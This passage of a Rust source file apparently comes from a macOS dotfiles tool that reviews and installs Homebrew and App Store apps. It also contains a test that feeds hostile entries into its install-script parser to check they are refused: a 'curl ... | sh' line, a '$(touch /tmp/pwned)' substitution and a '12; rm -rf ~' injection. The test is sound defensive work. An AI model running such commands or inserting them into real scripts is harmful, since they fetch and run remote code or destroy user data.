/// attempt could only fail, and would read as a failure of the tool.
pub fn choose(triage: &mut Triage, chosen: &[usize]) -> Vec<Item> {
    let chosen: BTreeSet<usize> = chosen.iter().copied().collect();
    let mut selected = Vec::new();
    for (n, item) in std::mem::take(&mut triage.offered).into_iter().enumerate() {
        if !chosen.contains(&n) {
            triage.skipped.push((item, SkipReason::Deselected));
        } else if item.flags.iter().any(|f| f.uninstallable()) {
            triage.skipped.push((item, SkipReason::Uninstallable));
        } else {
            selected.push(item);
        }
    }
    selected
}

/// Removes App Store titles when the user is known to be signed out.
pub fn drop_app_store_if_signed_out(
    selected: Vec<Item>,
    account: AppStoreAccount,
    skipped: &mut Vec<(Item, SkipReason)>,
) -> Vec<Item> {
    if account != AppStoreAccount::SignedOut {
        return selected;
    }
    let (store, rest): (Vec<Item>, Vec<Item>) =
        selected.into_iter().partition(|i| i.kind == Kind::AppStore);
    skipped.extend(store.into_iter().map(|i| (i, SkipReason::SignedOut)));
    rest
}

// ---------------------------------------------------------------------------
// The skip file
// ---------------------------------------------------------------------------

/// `~/.config/dotdipper/apps-skip.toml`: what this machine's user said no
/// to, so the next run does not ask again. Per machine on purpose: it lives
/// beside the config, not in the store, so it is never pushed.
#[derive(Debug, Default, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SkipFile {
    #[serde(default)]
    pub skip: BTreeSet<String>,
}

impl SkipFile {
    pub fn default_path() -> Result<PathBuf> {
        Ok(crate::paths::base_dir()?.join(SKIP_FILE_NAME))
    }

    /// Loads the file. A missing file is an empty list. An unreadable or
    /// malformed one is also treated as empty, with a warning returned for
    /// the caller to print: the file only saves the user a question, so
    /// losing it must not stop an install. The worst case is being asked
    /// again.
    pub fn load(path: &Path) -> (Self, Option<String>) {
        match std::fs::read_to_string(path) {
            Ok(text) => match toml::from_str(&text) {
                Ok(file) => (file, None),
                Err(e) => (
                    Self::default(),
                    Some(format!(
                        "Ignoring {}: it could not be parsed ({}). Every item will be offered; \
                         the file is rewritten after you confirm.",
                        path.display(),
                        e.message()
                    )),
                ),
            },
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => (Self::default(), None),
            Err(e) => (
                Self::default(),
                Some(format!("Ignoring {}: {e}", path.display())),
            ),
        }
    }

    pub fn save(&self, path: &Path) -> Result<()> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let mut text = String::from(
            "# Apps you deselected in `dotdipper install apps` on this machine.\n\
             # They are not offered again. Remove a line, or run with --reselect,\n\
             # to be asked about it again.\n",
        );
        text.push_str(&toml::to_string(self)?);
        // Write beside it and rename, so an interrupted save leaves the old
        // file or the new one, never half of one.
        let tmp = path.with_extension("toml.tmp");
        std::fs::write(&tmp, text).with_context(|| format!("Failed to write {}", tmp.display()))?;
        std::fs::rename(&tmp, path).with_context(|| format!("Failed to replace {}", path.display()))
    }

    /// Records a picker decision. Only an active "no" is remembered: an
    /// item that started checked and was unchecked. An item that started
    /// unchecked (a third-party tap, say) and was left alone was never
    /// decided on, and remembering it would hide it from every later run.
    /// Anything checked is forgotten.
    pub fn record(&mut self, offered: &[Item], chosen: &[usize]) {
        for (n, item) in offered.iter().enumerate() {
            if chosen.contains(&n) {
                self.skip.remove(&item.name);
            } else if item.default_selected() {
                self.skip.insert(item.name.clone());
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Rendering
// ---------------------------------------------------------------------------

fn truncate(text: &str, max: usize) -> String {
    let text = sanitize_display(text);
    if text.chars().count() <= max {
        return text;
    }
    let mut out: String = text.chars().take(max.saturating_sub(1)).collect();
    out.push('…');
    out
}

fn flag_list(item: &Item) -> String {
    item.flags
        .iter()
        .filter(|f| **f != Flag::NeedsAppStore)
        .map(|f| f.label())
        .collect::<Vec<_>>()
        .join(", ")
}

/// One checklist row, in parts the picker can color: group, name, then
/// description and homepage domain, then flags.
pub fn pick_item(item: &Item, checked: bool) -> crate::ui::picker::PickItem {
    use crate::ui::picker::{Color, PickItem};
    let color = match item.kind {
        Kind::Formula => Color::Cyan,
        Kind::Cask => Color::Magenta,
        Kind::AppStore => Color::Blue,
    };
    let mut detail = item
        .desc
        .as_deref()
        .map(|d| truncate(d, 56))
        .unwrap_or_default();
    if let Some(domain) = item.homepage.as_deref().and_then(homepage_domain) {
        let _ = write!(detail, " ({})", sanitize_display(&domain));
    }
    let flags = flag_list(item);
    PickItem::new(
        format!("{:<28}", sanitize_display(&item.display_name())),
        checked,
    )
    .with_tag(item.kind.tag(), color)
    .with_detail((!detail.trim().is_empty()).then(|| detail.trim().to_string()))
    .with_warning((!flags.is_empty()).then_some(flags))
}

/// One plain-text row: group, name, short description, homepage domain, flags.
pub fn option_label(item: &Item) -> String {
    let mut s = format!("{} {:<28}", item.kind.tag(), item.display_name());
    if let Some(desc) = &item.desc {
        let _ = write!(s, " {}", truncate(desc, 48));
    }
    if let Some(domain) = item.homepage.as_deref().and_then(homepage_domain) {
        let _ = write!(s, " ({})", sanitize_display(&domain));
    }
    let flags = flag_list(item);
    if !flags.is_empty() {
        let _ = write!(s, " [{flags}]");
    }
    s
}

/// The review shown before the single confirmation.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Summary {
    pub to_install: usize,
    pub needs_password: usize,
    pub app_store: usize,
    pub flagged: Vec<String>,
    pub taps: Vec<String>,
}

/// Taps the selected items need that are not already present. Only these
/// are tapped; a tap line in the Brewfile alone never causes a tap.
pub fn required_taps(selected: &[Item], tapped: &BTreeSet<String>) -> Vec<String> {
    let taps: BTreeSet<String> = selected
        .iter()
        .filter_map(|i| i.required_tap())
        .filter(|t| !tapped.contains(&t.to_ascii_lowercase()))
        .filter(|t| is_safe_token(t))
        .map(str::to_string)
        .collect();
    taps.into_iter().collect()
}

pub fn summarize(selected: &[Item], tapped: &BTreeSet<String>) -> Summary {
    Summary {
        to_install: selected.len(),
        needs_password: selected
            .iter()
            .filter(|i| i.has(Flag::NeedsPassword))
            .count(),
        app_store: selected.iter().filter(|i| i.kind == Kind::AppStore).count(),
        flagged: selected
            .iter()
            // A password or the App Store is counted above; flagged means
            // something about the package itself deserves a second look.
            .filter(|i| {
                i.flags
                    .iter()
                    .any(|f| !matches!(f, Flag::NeedsPassword | Flag::NeedsAppStore))
            })
            .map(|i| format!("{} [{}]", i.display_name(), flag_list(i)))
            .collect(),
        taps: required_taps(selected, tapped),
    }
}

pub fn render_summary(summary: &Summary, account: AppStoreAccount) -> String {
    let mut s = String::new();
    let _ = writeln!(s, "{} to install", summary.to_install);
    if summary.needs_password > 0 {
        let _ = writeln!(
            s,
            "{} need an administrator password; you will be asked once, before anything installs",
            summary.needs_password
        );
    }
    if summary.app_store > 0 {
        let status = match account {
            AppStoreAccount::SignedIn => "signed in",
            AppStoreAccount::SignedOut => "NOT signed in; these will be skipped",
            AppStoreAccount::Unknown => {
                "sign-in could not be checked (this mas cannot report it); \
                 sign in to the App Store app before continuing"
            }
            AppStoreAccount::NotNeeded => "not needed",
        };
        let _ = writeln!(s, "{} from the App Store: {status}", summary.app_store);
    }
    if !summary.taps.is_empty() {
        let _ = writeln!(
            s,
            "Will tap {} (third-party code, run with your privileges)",
            summary.taps.join(", ")
        );
    }
    if !summary.flagged.is_empty() {
        let _ = writeln!(s, "Flagged:");
        for line in &summary.flagged {
            let _ = writeln!(s, "  {line}");
        }
    }
    s
}

/// The `--dry-run` output: what would be installed and why the rest is not.
pub fn render_plan(selected: &[Item], triage: &Triage, resolution: &Resolution) -> String {
    let mut s = String::new();
    for kind in [Kind::Formula, Kind::Cask, Kind::AppStore] {
        let group: Vec<&Item> = selected.iter().filter(|i| i.kind == kind).collect();
        if group.is_empty() {
            continue;
        }
        let _ = writeln!(s, "{} ({})", kind.group(), group.len());
        for item in group {
            let _ = writeln!(s, "  {}", option_label(item).trim_end());
        }
    }
    if selected.is_empty() {
        let _ = writeln!(s, "Nothing to install.");
    }
    s.push('\n');
    s.push_str(&render_summary(
        &summarize(selected, &resolution.tapped),
        resolution.account,
    ));
    render_left_out(&mut s, triage, &resolution.rejected);
    s
}

/// `name (reason) [flags]`: the flags are usually *why* an item was left
/// unchecked, so the line answers the question it raises.
fn skipped_line(item: &Item, reason: &SkipReason) -> String {
    let flags = flag_list(item);
    if flags.is_empty() {
        format!("{} ({})", item.display_name(), reason.describe())
    } else {
        format!("{} ({}) [{flags}]", item.display_name(), reason.describe())
    }
}

fn render_left_out(s: &mut String, triage: &Triage, rejected: &[String]) {
    if !triage.present.is_empty() {
        let _ = writeln!(s, "Already installed: {}", triage.present.len());
    }
    // With --only, everything else is "not named", which is a count, not a list.
    let (unnamed, listed): (Vec<_>, Vec<_>) = triage
        .skipped
        .iter()
        .partition(|(_, r)| *r == SkipReason::NotOnly);
    if !listed.is_empty() {
        let _ = writeln!(s, "Not installing:");
        for (item, reason) in listed {
            let _ = writeln!(s, "  {}", skipped_line(item, reason));
        }
    }
    if !unnamed.is_empty() {
        let _ = writeln!(s, "Not named by --only: {}", unnamed.len());
    }
    if !rejected.is_empty() {
        let _ = writeln!(
            s,
            "Ignored {} inventory {} that {} not a plain Homebrew name",
            rejected.len(),
            if rejected.len() == 1 {
                "entry"
            } else {
                "entries"
            },
            if rejected.len() == 1 { "is" } else { "are" },
        );
    }
    for key in &triage.unknown_only {
        let _ = writeln!(s, "--only {key}: not in the inventory");
    }
    for (key, full) in &triage.needs_full_name {
        let _ = writeln!(
            s,
            "--only {key}: only {full} matches, from a third-party tap; name it in full to install it"
        );
    }
}

// ---------------------------------------------------------------------------
// Execution
// ---------------------------------------------------------------------------

/// What happened, for the final report.
#[derive(Debug, Default, Clone)]
pub struct Report {
    pub installed: Vec<Item>,
    /// Item, reason, and the command that retries it.
    pub failed: Vec<(Item, String, String)>,
    pub skipped: Vec<(Item, SkipReason)>,
    pub present: Vec<Item>,
    pub taps_failed: Vec<(String, String)>,
}

impl Report {
    pub fn render(&self) -> String {
        let mut s = String::new();
        let _ = writeln!(s, "Installed: {}", self.installed.len());
        for item in &self.installed {
            let _ = writeln!(s, "  {}", item.display_name());
        }
        let _ = writeln!(s, "Already present: {}", self.present.len());
        let _ = writeln!(s, "Skipped: {}", self.skipped.len());
        let mut unnamed = 0usize;
        for (item, reason) in &self.skipped {
            if *reason == SkipReason::NotOnly {
                unnamed += 1;
            } else {
                let _ = writeln!(s, "  {}", skipped_line(item, reason));
            }
        }
        if unnamed > 0 {
            let _ = writeln!(s, "  {unnamed} not named by --only");
        }
        let _ = writeln!(s, "Failed: {}", self.failed.len());
        for (tap, reason) in &self.taps_failed {
            let _ = writeln!(s, "  tap {tap}: {reason}");
            let _ = writeln!(s, "    retry: brew tap {tap}");
        }
        for (item, reason, retry) in &self.failed {
            let _ = writeln!(s, "  {}: {reason}", item.display_name());
            let _ = writeln!(s, "    retry: {retry}");
        }
        s
    }

    pub fn ok(&self) -> bool {
        self.failed.is_empty() && self.taps_failed.is_empty()
    }
}

/// Installs `selected` in display order (CLI tools first, so a `mas`
/// formula is in place before the App Store titles that need it).
///
/// Never aborts: each failure is recorded with its retry command and the
/// run moves on. `progress` is called before each step with a label.
pub fn execute(
    selected: &[Item],
    tapped: &BTreeSet<String>,
    host: &mut dyn Host,
    progress: &mut dyn FnMut(&str),
) -> Report {
    let mut report = Report::default();
    let mut failed_taps: BTreeSet<String> = BTreeSet::new();

    for tap in required_taps(selected, tapped) {
        progress(&format!("tap {tap}"));
        let outcome = host.brew(&args(&["tap", "--", &tap]));
        match outcome {
            Ok(out) if out.success => {}
            Ok(out) => {
                report.taps_failed.push((tap.clone(), out.reason()));
                failed_taps.insert(tap);
            }
            Err(e) => {
                report.taps_failed.push((tap.clone(), format!("{e:#}")));
                failed_taps.insert(tap);
            }
        }
    }

    let mut order: Vec<&Item> = selected.iter().collect();
    order.sort_by_key(|i| i.kind);
    let mut mas_checked: Option<bool> = None;

    for item in order {
        progress(&item.display_name());
        if !is_safe_token(&item.token) && item.kind != Kind::AppStore {
            report.failed.push((
                item.clone(),
                "not a plain Homebrew name; refused".into(),
                String::new(),
            ));
            continue;
        }
        if let Some(tap) = item.required_tap().filter(|t| failed_taps.contains(*t)) {
            report.skipped.push((
                item.clone(),
                SkipReason::Dependency(format!("tap {tap} failed")),
            ));
            continue;
        }
        if item.has(Flag::NeedsPassword) && !host.ensure_admin() {
            report
                .skipped
                .push((item.clone(), SkipReason::NoTerminalForPassword));
            continue;
        }
        let outcome = match item.kind {
            Kind::AppStore => {
                let has_mas = *mas_checked.get_or_insert_with(|| host.has_mas());
                if !has_mas {
                    report.skipped.push((
                        item.clone(),
                        SkipReason::Dependency("mas is not installed".into()),
                    ));
                    continue;
                }
                host.mas(&item.install_args(), item.has(Flag::NeedsPassword))
            }
            _ => host.brew(&item.install_args()),
        };
        match outcome {
            Ok(out) if out.success => report.installed.push(item.clone()),
            Ok(out) => report
                .failed
                .push((item.clone(), out.reason(), item.retry_command())),
            Err(e) => report
                .failed
                .push((item.clone(), format!("{e:#}"), item.retry_command())),
        }
    }
    report
}

// ---------------------------------------------------------------------------
// The real host and the interactive run (macOS)
// ---------------------------------------------------------------------------

/// Runs real commands. Lookups are captured. Once [`SystemHost::go_live`]
/// is called, installs show brew's and mas's output as it arrives, so a
/// long download is visibly progressing and any prompt is on screen; the
/// output is also kept, for the reason a failure is reported with.
#[derive(Debug, Default)]
pub struct SystemHost {
    brew: Option<PathBuf>,
    live: bool,
    /// A person is at the terminal to answer `sudo -v`.
    may_prompt: bool,
}

impl SystemHost {
    pub fn new() -> Result<Self> {
        let brew = which::which("brew").ok().or_else(|| {
            ["/opt/homebrew/bin/brew", "/usr/local/bin/brew"]
                .iter()
                .map(PathBuf::from)
                .find(|p| p.is_file())
        });
        let brew = brew.context(
            "Homebrew (brew) was not found. Install it from https://brew.sh and ensure it is on your PATH.",
        )?;
        Ok(SystemHost {
            brew: Some(brew),
            ..Default::default()
        })
    }

    /// Switches installs to live output; `may_prompt` when a person can
    /// answer a password prompt.
    pub fn go_live(&mut self, may_prompt: bool) {
        self.live = true;
        self.may_prompt = may_prompt;
    }

    fn mas_path() -> Option<PathBuf> {
        which::which("mas").ok().or_else(|| {
            ["/opt/homebrew/bin/mas", "/usr/local/bin/mas"]
                .iter()
                .map(PathBuf::from)
                .find(|p| p.is_file())
        })
    }
}

/// Runs `cmd` showing its output as it arrives, indented and dimmed under
/// the item's heading, and keeps a copy. stdin stays the terminal, so a
/// prompt from anything it runs can be answered.
fn stream(mut cmd: std::process::Command) -> Result<CmdOutput> {
    cmd.stdin(std::process::Stdio::inherit());
    run_piped(cmd, true)
}

fn capture(mut cmd: std::process::Command) -> Result<CmdOutput> {
    cmd.stdin(std::process::Stdio::null());
    run_piped(cmd, false)
}

/// After the command exits, how long to keep collecting output that is
/// still in flight.
const DRAIN: std::time::Duration = std::time::Duration::from_secs(2);
/// Silence after which a live run says it is still working.
const HEARTBEAT: std::time::Duration = std::time::Duration::from_secs(60);
/// Progress lines ending in a carriage return (mas's download meter) are
/// shown at most this often.
const PROGRESS_EVERY: std::time::Duration = std::time::Duration::from_secs(5);

/// Runs `cmd` with its output piped, and returns when the command itself
/// exits, not when its output closes.
///
/// An install can leave a helper running that inherited brew's stdout:
/// Homebrew's own background tasks, an App Store daemon, an app launched by
/// its installer. That helper holds the pipe open, so waiting for the end of
/// the output waits for the helper, possibly forever, although the install
/// is done. Output still in flight is collected for [`DRAIN`] after exit.
fn run_piped(mut cmd: std::process::Command, live: bool) -> Result<CmdOutput> {
    use std::io::Read;
    use std::process::Stdio;
    use std::sync::mpsc::{self, RecvTimeoutError};
    use std::time::{Duration, Instant};

    let mut child = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .with_context(|| format!("Failed to run {:?}", cmd.get_program()))?;

    // (from stderr, ended by a carriage return, text)
    let (tx, rx) = mpsc::channel::<(bool, bool, String)>();
    let pipes: [(bool, Box<dyn Read + Send>); 2] = [
        (false, Box::new(child.stdout.take().expect("piped stdout"))),
        (true, Box::new(child.stderr.take().expect("piped stderr"))),
    ];
    for (is_err, mut pipe) in pipes {
        let tx = tx.clone();
        // Left running if a helper keeps the pipe open; it ends with it.
        std::thread::spawn(move || {
            let mut buf = [0u8; 8192];
            let mut pending: Vec<u8> = Vec::new();
            while let Ok(n) = pipe.read(&mut buf) {
                if n == 0 {
                    break;
                }
                for &b in &buf[..n] {
                    if b == b'\n' || b == b'\r' {
                        let text = String::from_utf8_lossy(&pending).into_owned();
                        pending.clear();
                        if tx.send((is_err, b == b'\r', text)).is_err() {
                            return;
                        }
                    } else {
                        pending.push(b);
                    }
                }
            }
            if !pending.is_empty() {
                let _ = tx.send((
                    is_err,
                    false,
                    String::from_utf8_lossy(&pending).into_owned(),
                ));
            }
        });
    }
    drop(tx);

    let started = Instant::now();
    let mut heard = Instant::now();
    let mut last_progress: Option<Instant> = None;
    let (mut stdout, mut stderr) = (String::new(), String::new());
    let mut exited: Option<(std::process::ExitStatus, Instant)> = None;
    loop {
        match rx.recv_timeout(Duration::from_millis(200)) {
            Ok((is_err, progress, text)) => {
                heard = Instant::now();
                if text.trim().is_empty() {
                    continue;
                }
                let show = !progress || last_progress.is_none_or(|t| t.elapsed() >= PROGRESS_EVERY);
                if progress && show {
                    last_progress = Some(Instant::now());
                }
                if live && show {
                    eprintln!("    {}", console::style(sanitize_display(&text)).dim());
                }
                if !progress {
                    let kept = if is_err { &mut stderr } else { &mut stdout };
                    kept.push_str(&text);
                    kept.push('\n');
                }
            }
            Err(RecvTimeoutError::Timeout) => {}
            // Both pipes closed: the normal end.
            Err(RecvTimeoutError::Disconnected) => {
                let status = match exited {
                    Some((status, _)) => status,
                    None => child.wait().context("Failed to wait for the command")?,
                };
                exited = Some((status, Instant::now()));
                break;
            }
        }
        if exited.is_none() {
            if let Some(status) = child.try_wait().context("Failed to wait for the command")? {
                exited = Some((status, Instant::now()));
            }
        }
        if let Some((_, at)) = exited {
            if at.elapsed() >= DRAIN {
                break;
            }
        } else if live && heard.elapsed() >= HEARTBEAT {
            let secs = started.elapsed().as_secs();
            eprintln!(
                "    {}",
                console::style(format!(
                    "… still working ({}m {:02}s)",
                    secs / 60,
                    secs % 60
                ))
                .dim()
            );
            heard = Instant::now();
        }
    }
    let (status, _) = exited.expect("set before the loop ends");
    Ok(CmdOutput {
        success: status.success(),
        stdout,
        stderr,
    })
}

impl Host for SystemHost {
    fn brew(&mut self, list: &[String]) -> Result<CmdOutput> {
        let brew = self.brew.as_ref().context("brew is not available")?;
        let mut cmd = std::process::Command::new(brew);
        cmd.args(list);
        // Read-only lookups need not refresh Homebrew first; an install
        // keeps brew's normal auto-update behaviour.
        let installs = list.first().is_some_and(|a| a == "install" || a == "tap");
        if !installs {
            cmd.env("HOMEBREW_NO_AUTO_UPDATE", "1");
        }
        if installs && self.live {
            stream(cmd)
        } else {
            capture(cmd)
        }
    }

    fn mas(&mut self, list: &[String], as_root: bool) -> Result<CmdOutput> {
        let mas = Self::mas_path().context("mas is not installed")?;
        let cmd = if as_root {
            let mut c = std::process::Command::new("sudo");
            c.arg("-n").arg(mas).args(list);
            c
        } else {
            let mut c = std::process::Command::new(mas);
            c.args(list);
            c
        };
        if self.live && list.first().is_some_and(|a| a == "install") {
            stream(cmd)
        } else {
            capture(cmd)
        }
    }

    fn has_mas(&mut self) -> bool {
        Self::mas_path().is_some()
    }

    fn ensure_admin(&mut self) -> bool {
        if sudo_is_cached() {
            return true;
        }
        if !self.may_prompt {
            return false;
        }
        crate::ui::warn("The administrator approval lapsed; asking again.");
        std::process::Command::new("sudo")
            .arg("-v")
            .status()
            .is_ok_and(|s| s.success())
    }
}

/// Whether sudo holds a valid approval, checked without prompting.
fn sudo_is_cached() -> bool {
    std::process::Command::new("sudo")
        .args(["-n", "-v"])
        .stdin(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|s| s.success())
}

/// Holds one `sudo` authorization open for the length of the run.
///
/// dotdipper never sees the password: `sudo` reads it from the terminal
/// itself, and what macOS keeps is a time-limited approval for this
/// terminal, not the password. When this run asked for it, the approval is
/// revoked with `sudo -k` at the end, so it does not outlive the install.
///
/// Casks that ship a `.pkg` call `sudo installer` themselves, and the
/// default timestamp lasts five minutes; a long run would otherwise stop
/// half-way for a password nobody is watching for. A background thread
/// refreshes the timestamp every minute and stops when this is dropped.
pub struct SudoKeepalive {
    stop: std::sync::Arc<std::sync::atomic::AtomicBool>,
    handle: Option<std::thread::JoinHandle<()>>,
    /// This run asked for the approval, so it also takes it back.
    revoke: bool,
}

impl SudoKeepalive {
    /// Prompts once with `sudo -v`, then starts the refresher.
    pub fn start() -> Result<Self> {
        let status = std::process::Command::new("sudo")
            .arg("-v")
            .status()
            .context("Failed to run sudo")?;
        if !status.success() {
            anyhow::bail!("sudo authorization was not granted");
        }
        let mut keep = Self::spawn();
        keep.revoke = true;
        Ok(keep)
    }

    /// Uses an authorization that is already cached, without prompting.
    pub fn reuse() -> Option<Self> {
        sudo_is_cached().then(Self::spawn)
    }

    fn spawn() -> Self {
        use std::sync::atomic::Ordering;
        let stop = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
        let flag = stop.clone();
        let handle = std::thread::spawn(move || {
            let mut ticks = 0u32;
            while !flag.load(Ordering::Relaxed) {
                std::thread::sleep(std::time::Duration::from_secs(1));
                ticks += 1;
                if ticks >= 60 {
                    ticks = 0;
                    sudo_is_cached();
                }
            }
        });
        SudoKeepalive {
            stop,
            handle: Some(handle),
            revoke: false,
        }
    }
}

impl Drop for SudoKeepalive {
    fn drop(&mut self) {
        self.stop.store(true, std::sync::atomic::Ordering::Relaxed);
        if let Some(h) = self.handle.take() {
            let _ = h.join();
        }
        if self.revoke {
            let _ = std::process::Command::new("sudo").arg("-k").status();
        }
    }
}

/// Options for [`run`], one per command-line flag.
#[derive(Debug, Clone, Default)]
pub struct Options {
    pub all: bool,
    pub only: Vec<String>,
    pub skip: Vec<String>,
    pub dry_run: bool,
    pub yes: bool,
    pub reselect: bool,
    /// Read the inventory from this Brewfile or install-apps.sh instead of
    /// the store.
    pub from: Option<PathBuf>,
}

fn interactive() -> bool {
    use std::io::IsTerminal;
    std::io::stdin().is_terminal() && std::io::stderr().is_terminal()
}

fn running_as_root() -> bool {
    std::process::Command::new("id")
        .arg("-u")
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim() == "0")
        .unwrap_or(false)
}

/// The whole flow: resolve, decide, install, report.
///
/// Returns an error only when nothing could be attempted; individual
/// failures are in the printed report and make the result an error at the
/// end, so a script calling this sees a non-zero exit.
pub fn run(store: &Path, opts: &Options) -> Result<()> {
    use crate::ui;

    if !cfg!(target_os = "macos") {
        anyhow::bail!(
            "`dotdipper install apps` installs Homebrew packages and App Store titles, and runs on macOS only. \
             Use `dotdipper install apps-script` to produce a script you can read or share from here."
        );
    }
    if running_as_root() {
        anyhow::bail!(
            "Do not run this under sudo. Homebrew refuses to run as root; dotdipper asks for \
             your password itself when a selected item needs it."
        );
    }

    let tty = interactive();
    let use_picker = tty && !opts.all && opts.only.is_empty() && !opts.dry_run;
    if !tty && !opts.dry_run && !opts.all && opts.only.is_empty() && !opts.yes {
        anyhow::bail!(
            "No terminal to show the app picker on. Re-run with --all (the default selection), \
             --only a,b, or --yes, or use --dry-run to see the plan."
        );
    }

    let wanted = match &opts.from {
        Some(path) => load_wanted_file(path)?,
        None => load_wanted(store)?.with_context(|| {
            format!(
                "No Brewfile, apps_manifest.toml or {INSTALL_SCRIPT} in {}. Run 'dotdipper apps capture' \
                 on the source machine first, or pass --from <file>.",
                store.display()
            )
        })?,
    };

    let mut host = SystemHost::new()?;
    ui::info("Looking up every entry with Homebrew...");
    let resolution = resolve(&wanted, &mut host)?;

    let skip_path = SkipFile::default_path()?;
    let (mut skip_file, warning) = SkipFile::load(&skip_path);
    if let Some(warning) = warning {
        ui::warn(&warning);
    }
    let filters = Filters {
        only: opts.only.clone(),
        skip: opts.skip.clone(),
        remembered: skip_file.skip.clone(),
        reselect: opts.reselect,
    };
    let mut triage = triage(resolution.items.clone(), &filters);

    // The picker's decision is recorded here but saved only after the
    // review is confirmed: declining means none of it happened.
    let mut picked = false;
    let chosen: Vec<usize> = if use_picker && !triage.offered.is_empty() {
        let chosen = pick(&triage.offered)?;
        skip_file.record(&triage.offered, &chosen);
        picked = true;
        chosen
    } else if !opts.only.is_empty() {
        (0..triage.offered.len()).collect()
    } else {
        default_selection(&triage.offered)
    };
    let selected = choose(&mut triage, &chosen);

    if opts.dry_run {
        print!("{}", render_plan(&selected, &triage, &resolution));
        return Ok(());
    }

    let mut skipped = std::mem::take(&mut triage.skipped);
    let mut selected = drop_app_store_if_signed_out(selected, resolution.account, &mut skipped);
    if resolution.account == AppStoreAccount::SignedOut
        && skipped.iter().any(|(_, r)| *r == SkipReason::SignedOut)
    {
        ui::warn("You are not signed in to the App Store; App Store titles will be skipped.");
        ui::hint("Sign in with the App Store app, then run 'dotdipper install apps' again.");
    }

    if selected.is_empty() {
        let mut s = String::new();
        triage.skipped = skipped;
        render_left_out(&mut s, &triage, &resolution.rejected);
        print!("{s}");
        ui::success("Nothing to install.");
        return Ok(());
    }

    ui::section("Review");
    print!(
        "{}",
        render_summary(
            &summarize(&selected, &resolution.tapped),
            resolution.account
        )
    );
    if tty
        && !opts.yes
        && !ui::prompt_confirm(&format!("Install {} item(s)?", selected.len()), true)
    {
        ui::info("Nothing installed.");
        return Ok(());
    }
    if picked {
        if let Err(e) = skip_file.save(&skip_path) {
            ui::warn(&format!("Could not remember your choices: {e:#}"));
        }
    }

    let _sudo = if selected.iter().any(|i| i.has(Flag::NeedsPassword)) {
        match SudoKeepalive::reuse() {
            Some(keep) => Some(keep),
            None if tty => {
                ui::info("Some selected items need an administrator password. Asking once now.");
                Some(SudoKeepalive::start()?)
            }
            None => {
                let (needs, rest): (Vec<Item>, Vec<Item>) = selected
                    .into_iter()
                    .partition(|i| i.has(Flag::NeedsPassword));
                skipped.extend(
                    needs
                        .into_iter()
                        .map(|i| (i, SkipReason::NoTerminalForPassword)),
                );
                selected = rest;
                None
            }
        }
    } else {
        None
    };

    // A heading per item, with brew's own output streamed beneath it: a
    // spinner would redraw over a prompt and hide that a download is moving.
    host.go_live(tty);
    let total = selected.len();
    let mut n = 0usize;
    let mut report = execute(&selected, &resolution.tapped, &mut host, &mut |label| {
        if let Some(tap) = label.strip_prefix("tap ") {
            println!("\n{} {}", console::style("==> Tapping").cyan().bold(), tap);
            return;
        }
        n += 1;
        println!(
            "\n{} {}",
            console::style(format!("[{n}/{total}]")).cyan().bold(),
            console::style(label).bold()
        );
    });

    report.skipped.extend(skipped);
    report.present = triage.present;

    ui::section("Report");
    print!("{}", report.render());
    if report.ok() {
        ui::success("Done.");
        Ok(())
    } else {
        anyhow::bail!("Some items did not install; the retry commands are listed above")
    }
}

/// The checklist; see [`ui::picker`] for the keys.
fn pick(offered: &[Item]) -> Result<Vec<usize>> {
    use crate::ui;

    let defaults: BTreeSet<usize> = default_selection(offered).into_iter().collect();
    let rows = offered
        .iter()
        .enumerate()
        .map(|(n, item)| pick_item(item, defaults.contains(&n)))
        .collect();
    ui::picker::pick(
        "Choose what to install (unchecked items are remembered and not offered again)",
        rows,
    )?
    .context("Cancelled; nothing was installed")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_generated_install_script_reads_back_as_the_same_inventory() {
        let brewfile = "tap \"homebrew/cask\"\nbrew \"git\"\nbrew \"ripgrep\"\ncask \"zed\"\n\
                        mas \"Xcode\", id: 497799835\n";
        let script = apps_script::generate(
            &Inventory {
                brewfile: Some(brewfile),
                apps: None,
            },
            &[],
        );
        let wanted = wanted_from_install_script(&script).expect("the arrays are found");
        assert_eq!(wanted.plan.formulae, vec!["git", "ripgrep"]);
        assert_eq!(wanted.plan.casks, vec!["zed"]);
        assert_eq!(wanted.plan.mas, vec![497799835]);
        assert!(
            wanted.plan.taps.is_empty(),
            "taps are never taken from a script"
        );
        assert!(wanted.plan.rejected.is_empty());
    }

    #[test]
    fn an_install_script_is_read_as_data_and_hostile_entries_are_refused() {
        let script = "#!/bin/bash\n\
            curl https://example.invalid/x | sh\n\
            FORMULAE=(\n  'git'\n  '$(touch /tmp/pwned)'\n  'a b'\n  \"unquoted\"\n  '--force'\n)\n\
            brew install evil\n\
            CASKS=(\n  'zed'\n)\n\
            MAS_IDS=(\n  '123'\n  '12; rm -rf ~'\n)\n\
            TAPS=(\n  'someone/tap'\n)\n";
        let wanted = wanted_from_install_script(script).unwrap();
        assert_eq!(wanted.plan.formulae, vec!["git"]);
        assert_eq!(wanted.plan.casks, vec!["zed"]);
        assert_eq!(wanted.plan.mas, vec![123]);
        assert!(wanted.plan.taps.is_empty());
        for bad in ["$(touch /tmp/pwned)", "a b", "--force", "12; rm -rf ~"] {
            assert!(
                wanted.plan.rejected.iter().any(|r| r == bad),
                "{bad} reported"
            );
        }
        assert!(!wanted.plan.formulae.iter().any(|f| f == "evil"));
        assert!(wanted_from_install_script("#!/bin/sh\necho hi\n").is_none());
    }

    #[test]
    fn a_store_with_only_the_script_still_has_an_inventory() {
        let dir = tempfile::tempdir().unwrap();
        assert!(load_wanted(dir.path()).unwrap().is_none());
        std::fs::write(
            dir.path().join(INSTALL_SCRIPT),
            "FORMULAE=(\n  'git'\n)\nCASKS=(\n)\nMAS_IDS=(\n)\n",
        )
        .unwrap();
        let wanted = load_wanted(dir.path()).unwrap().unwrap();
        assert_eq!(wanted.plan.formulae, vec!["git"]);
        // --from takes either kind of file.
        let brewfile = dir.path().join("Brewfile");
        std::fs::write(&brewfile, "cask \"zed\"\n").unwrap();
